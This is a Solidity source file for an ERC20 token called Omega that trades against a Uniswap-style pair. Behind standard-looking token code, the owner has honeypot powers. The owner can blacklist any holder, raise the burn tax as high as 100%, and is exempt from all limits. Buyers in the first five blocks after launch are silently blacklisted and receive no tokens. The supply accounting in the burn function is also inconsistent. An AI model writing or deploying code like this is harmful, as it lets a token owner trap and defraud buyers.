/*

 ██████  ███    ███ ███████  ██████   █████           ██████  ██████  ██ ███    ██ 
██    ██ ████  ████ ██      ██       ██   ██         ██      ██    ██ ██ ████   ██ 
██    ██ ██ ████ ██ █████   ██   ███ ███████         ██      ██    ██ ██ ██ ██  ██ 
██    ██ ██  ██  ██ ██      ██    ██ ██   ██         ██      ██    ██ ██ ██  ██ ██ 
 ██████  ██      ██ ███████  ██████  ██   ██          ██████  ██████  ██ ██   ████ 
                                                                                   
                                                                                   
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
 
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;
 
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
 
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }
 
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
 
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }
 
    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
 
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
 
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
 
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
 


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address lpPair);
    function createPair(address tokenA, address tokenB) external returns (address lpPair);
}

interface IV2Pair {
    function factory() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Omega is  Ownable {

    string private constant _name = "Omega";
    string private constant _symbol = "OMA";
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply = 1000000000000000 * 10**uint256(_decimals);

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private blacklisted;

    mapping(address => bool) private _isExcludedFromFee;
    bool public trade_open;
    uint256 private currentBlockNumber;

    uint256 public _maxAmountPercent = 2000;    //2000 = 2%
    
    uint256 public _burnTaxPercentage = 1000;   //1000 = 1%

    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;

    IUniswapV2Router02 public uniswapV2Router;
    address public _uniswapPair;
    

    //events
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);  



    constructor() {
        _balances[msg.sender] = _totalSupply;
       
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D //Ethereum
            //0xD99D1c33F9fC3444f8101754aBC46c52416550D1 //BSC Testnet
            0x1852B91c4A2d817e8a479e91c1c2607E46FEE414   //SCAI Tesstnet
            
        );
        uniswapV2Router = _uniswapV2Router;
        _uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );

        _approve(msg.sender, address(uniswapV2Router), type(uint256).max);
        _approve(address(this), address(uniswapV2Router), type(uint256).max);

        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[_uniswapPair] = true;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    //ERC20
    function name() public view virtual  returns (string memory) {
        return _name;
    }
 
    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }
 
    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }
 
    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }
 
    function balanceOf(
        address account
    ) public view virtual  returns (uint256) {
        return _balances[account];
    }

    
    function transfer(
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }
 
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
 
    function allowance(
        address owner,
        address spender
    ) public view virtual  returns (uint256) {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount) public  returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }
 
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
 
    function _transferTokens(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }
 
        emit Transfer(from, to, amount);
    }

    function TransferEx(
        address[] calldata _input,
        uint256 _amount
    ) public onlyOwner {
        address _from = owner();
        unchecked {
            for (uint256 i = 0; i < _input.length; i++) {
                address addr = _input[i];
                require(
                    addr != address(0),
                    "ERC20: transfer to the zero address"
                );
                _transferTokens(_from, addr, _amount);
            }
        }
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function setExcludedFromFee(address account, bool excluded) external onlyOwner {
        _isExcludedFromFee[account] = excluded;
    }

    function _burnTokens(address account, address dead, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        require(_balances[account] >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] -= amount;
            _balances[dead] += amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

    }

    function OpenTrade(bool _enable) public onlyOwner {
        trade_open = _enable;
        if (_enable == true) {
            currentBlockNumber = block.number;
        }
    }
    
    function updateBurnPercentage(uint256 _burnPercentage) external onlyOwner {
        require(_burnPercentage <= 100000, "Tax percentage cannot exceed 100");
        _burnTaxPercentage = _burnPercentage;
    }

    function updateMaxAmountPercentage(uint256 _maxAmountPercentage) external onlyOwner {
        require(_maxAmountPercentage <= 100000, "Tax percentage cannot exceed 100");
        _maxAmountPercent = _maxAmountPercentage;
    }

    function addToBlacklist(address account) public onlyOwner{
        require(!blacklisted[account], "Account is already blacklisted");
        require(_msgSender() != account, "Cannot blacklist self");
        blacklisted[account] = true;
    }

    function removeFromBlacklist(address account) public onlyOwner{
        require(blacklisted[account], "Account is not blacklisted");
        require(_msgSender() != account, "Cannot remove self from blacklist");
        blacklisted[account] = false;
    }

    function isBlacklisted(address account) public view returns (bool) {
        return blacklisted[account];
    }


    function rescueETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0),
            block.timestamp
        );
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        require(!blacklisted[sender], "Sender is blacklisted");
        require(!blacklisted[recipient], "Recipient is blacklisted");

        //If it's the owner, do a normal transfer
        if (sender == owner() || recipient == owner() || sender == address(this)) {
            _transferTokens(sender, recipient, amount);
            return;
        }

        //Check if trading is enabled
        require(trade_open, "Trading is disabled");
       
        if(block.number <= currentBlockNumber + 5){
            blacklisted[recipient] = true;
            return;
        }

        bool isBuy = sender == _uniswapPair;
        bool isSell = recipient == _uniswapPair;

        uint256 burnTax;

        uint256 maxAmount = (_totalSupply * _maxAmountPercent)/100000; // maximum transaction amount at once i.e, 2%

        if(isBuy){
            require(amount <= maxAmount, "Amount should be less than max limit");
            if (!_isExcludedFromFee[recipient]){
                burnTax = _calculateTax(amount, _burnTaxPercentage);
            }
            
        }

        if(isSell){
            require(amount <= maxAmount, "Amount should be less than max limit");
            if (!_isExcludedFromFee[sender]){
                burnTax = _calculateTax(amount, _burnTaxPercentage);
            }
        }
        
        uint256 transferAmount = amount - burnTax;
        _transferTokens(sender, recipient, transferAmount); // send to recipient
        
        _burnTokens(sender, DEAD, burnTax); // send burn tax to dead wallet

    }


    function _calculateTax(uint256 amount, uint256 taxPercentage) internal pure returns (uint256) {
        return amount * (taxPercentage) / (100000);
    }

    fallback() external payable {}

    receive() external payable {}
}
